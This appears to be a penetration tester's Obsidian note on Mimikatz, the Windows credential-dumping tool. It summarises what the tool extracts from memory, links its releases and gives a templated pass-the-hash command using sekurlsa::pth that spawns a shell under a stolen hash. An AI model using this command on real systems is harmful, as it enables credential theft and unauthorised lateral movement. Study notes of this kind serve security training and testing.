```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
Mimikatz is a windows tool for extracting plaintext passwords, hashes, PIN codes, and kerberos tickets from memory. It is also capable of performing Pass-the-Hash, Pass-the-Ticket, or build *Golden* tickets.
> [pypykatz](https://github.com/skelsec/pypykatz) is a python implementation of the tool that can be run on linux systems.

## Installation
Pre-built binaries available in the git repo: https://github.com/gentilkiwi/mimikatz/releases
## Documentation
**Cheatsheet:** 
**Website:** https://github.com/gentilkiwi/mimikatz
## Usage
### Pass-the-Hash
Using the `sekurlsa::pth` module we can perform a pass-the-hash attack. It starts a process using the user's hash.
```cmd
C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /NTLM:<hash> /domain:<AD_domain> /run:cmd.exe" exit
```
> We can specify any program in the `/run:` flag to launch any program but a shell is often most useful.